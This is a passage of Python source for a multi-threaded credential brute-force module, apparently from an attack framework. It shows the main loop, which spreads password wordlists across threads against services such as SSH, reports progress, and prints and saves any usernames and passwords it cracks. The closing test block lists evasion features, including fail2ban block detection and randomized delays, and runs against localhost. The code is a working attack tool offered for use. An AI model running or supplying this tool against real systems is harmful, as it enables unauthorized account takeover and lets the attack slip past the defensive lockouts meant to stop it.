        print(f"    Max attempts: {len(credentials)}")
        
        self.log_message(f"Attack Configuration: Target={target}:{port}, Threads={threads}, Timeout={timeout}s", "INFO")
        
        if len(credentials) > 10000:
            est_time = (len(credentials) * delay) / max(threads, 1)
            if rate_limit > 0:
                est_time = max(est_time, (len(credentials) * 60 / rate_limit))
            print(f"    Estimated time: ~{est_time:.0f} seconds")
        
        print("\n" + "=" * 60)
        print("[*] Starting brute force attack...")
        print("=" * 60 + "\n")
        
        self.log_message("Starting brute force attack", "INFO")
        
        # Start timing
        self.start_time = time.time()
        self.running = True
        self.block_retry_count = 0
        
        # Store config for worker threads
        thread_config = {
            'timeout': timeout,
            'delay': delay,
            'stop_on_success': stop_on_success,
            'session_timeout': session_timeout,
            'keepalive_interval': keepalive_interval,
            'max_retries': max_retries
        }
        
        # Split credentials for threads
        chunk_size = max(1, len(credentials) // max(threads, 1))
        credential_chunks = [credentials[i:i + chunk_size] for i in range(0, len(credentials), chunk_size)]
        
        # Start worker threads
        thread_list = []
        for i, chunk in enumerate(credential_chunks):
            if not self.running or not chunk:
                break
            
            thread = threading.Thread(
                target=self.worker_thread,
                args=(target, port, service, chunk, thread_config),
                name=f"BruteThread-{i+1}"
            )
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        # Monitor progress
        try:
            last_count = 0
            last_update = self.start_time
            stats_interval = 5  # Update stats every 5 seconds
            
            while any(t.is_alive() for t in thread_list) and self.running:
                time.sleep(0.5)
                
                # Show progress every stats_interval seconds
                current_time = time.time()
                elapsed = current_time - self.start_time
                
                if current_time - last_update >= stats_interval:
                    attempts_since = self.attempts - last_count
                    time_since = current_time - last_update
                    speed = attempts_since / time_since if time_since > 0 else 0
                    
                    progress = f"[*] Progress: {self.attempts:,}/{len(credentials):,} | "
                    progress += f"Speed: {speed:.1f}/sec | "
                    progress += f"Found: {self.success_count} | "
                    progress += f"Elapsed: {elapsed:.0f}s"
                    
                    if self.block_retry_count > 0:
                        progress += f" | Block retries: {self.block_retry_count}"
                    
                    if rate_limit > 0 and self.rate_limiter:
                        with self.rate_limiter['lock']:
                            remaining = max(0, rate_limit - self.rate_limiter['attempts'])
                            window_remaining = max(0, 60 - (current_time - self.rate_limiter['window_start']))
                            progress += f" | Rate: {remaining}/{rate_limit} ({window_remaining:.0f}s)"
                    
                    print(f"\r{progress}", end='', flush=True)
                    
                    last_count = self.attempts
                    last_update = current_time
        
        except KeyboardInterrupt:
            print("\n\n[!] Interrupted by user")
            self.log_message("Attack interrupted by user", "WARNING")
            self.running = False
        
        # Wait for threads to finish
        for thread in thread_list:
            thread.join(timeout=2)
        
        print()  # New line after progress
        
        # Calculate statistics
        elapsed_time = time.time() - self.start_time
        speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
        
        # Display results
        result = []
        result.append("\n" + "=" * 60)
        result.append("BRUTE FORCE COMPLETE - Enhanced Timeout Handling")
        result.append("=" * 60)
        
        if self.found_credentials:
            result.append(f"\n[+] SUCCESS! Found {len(self.found_credentials)} valid credentials:")
            self.log_message(f"Attack successful: {len(self.found_credentials)} credentials found", "SUCCESS")
            for cred in self.found_credentials:
                result.append(f"\n    Service: {cred['service']}")
                result.append(f"    Host: {cred['host']}:{cred['port']}")
                result.append(f"    Username: {cred['username']}")
                result.append(f"    Password: {cred['password']}")
                result.append(f"    Time: {cred['timestamp']}")
                if 'session_duration' in cred:
                    result.append(f"    Duration: {cred['session_duration']:.2f}s")
                result.append("    " + "-" * 25)
        else:
            result.append("\n[-] No valid credentials found")
            self.log_message("Attack completed: No credentials found", "INFO")
        
        result.append(f"\n[+] Statistics:")
        result.append(f"    Total attempts: {self.attempts:,}")
        result.append(f"    Total credentials tested: {len(credentials):,}")
        result.append(f"    Time elapsed: {elapsed_time:.2f} seconds")
        result.append(f"    Average speed: {speed:.1f} attempts/second")
        result.append(f"    Block retries: {self.block_retry_count}")
        
        if self.attempts < len(credentials):
            percent = (self.attempts / len(credentials)) * 100
            result.append(f"    Coverage: {percent:.1f}% of wordlist")
        
        # Save results to file
        if output_file and self.found_credentials:
            if self.save_results(output_file):
                result.append(f"\n[+] Results saved to: {output_file}")
        
        # Close log file
        if self.log_file_handle:
            self.log_file_handle.close()
            if log_file:
                result.append(f"[+] Session log saved to: {log_file}")
        
        result.append("\n" + "=" * 60)
        
        # Print results
        for line in result:
            print(line)
        
        return {
            'status': 'success',
            'message': 'Brute force attack completed with enhanced timeout handling',
            'target': f"{target}:{port}",
            'service': service,
            'attempts': self.attempts,
            'successes': len(self.found_credentials),
            'credentials_found': self.found_credentials,
            'elapsed_time': elapsed_time,
            'average_speed': speed,
            'block_retries': self.block_retry_count,
            'output_file': output_file if self.found_credentials else None,
            'log_file': log_file if log_file else None
        }

# For standalone testing
if __name__ == "__main__":
    module = ModuleClass()
    
    print("Complete Credential Brute Forcer - Test Mode")
    print("With all original features plus enhancements")
    print("-" * 60)
    
    # Test with all features
    test_config = {
        'RHOST': '127.0.0.1',
        'RPORT': '22',
        'SERVICE': 'ssh',
        'USERNAME': 'test',
        'PASS_FILE': 'test_passwords.txt',
        'THREADS': '3',
        'TIMEOUT': '3',
        'SESSION_TIMEOUT': '60',
        'KEEPALIVE_INTERVAL': '30',
        'MAX_RETRIES': '1',
        'DELAY': '0.1',
        'RATE_LIMIT': '30',
        'STOP_ON_SUCCESS': 'true',
        'OUTPUT_FILE': 'test_results.txt',
        'LOG_FILE': 'test_session.log',
        'VERBOSE': 'true',
        'BANNER_GRAB': 'true',
        'BLOCK_DETECTION': 'true',
        'BLOCK_WAIT': '300',
        'RANDOMIZE_DELAY': 'true'
    }
    
    print("\nFeatures included:")
    print("  ✓ All original credential generation methods")
    print("  ✓ Combo file support (highest priority)")
    print("  ✓ Wordlist loading with limits")
    print("  ✓ Common credentials database")
    print("  ✓ SSH timeout & keepalive")
    print("  ✓ Block detection (fail2ban)")
    print("  ✓ Randomized delays")
    print("  ✓ Full logging")
    print("-" * 60)
    
    result = module.execute(test_config)
    
    if isinstance(result, dict):
        print(f"\nFinal Status: {result['status']}")
        print(f"Message: {result['message']}")
        print(f"Attempts: {result['attempts']:,}")
        print(f"Successes: {result['successes']}")
        print(f"Time: {result['elapsed_time']:.2f}s")
        print(f"Speed: {result['average_speed']:.1f}/sec")
        print(f"Block Retries: {result.get('block_retries', 0)}")
    else:
        print(f"\nResult: {result}")
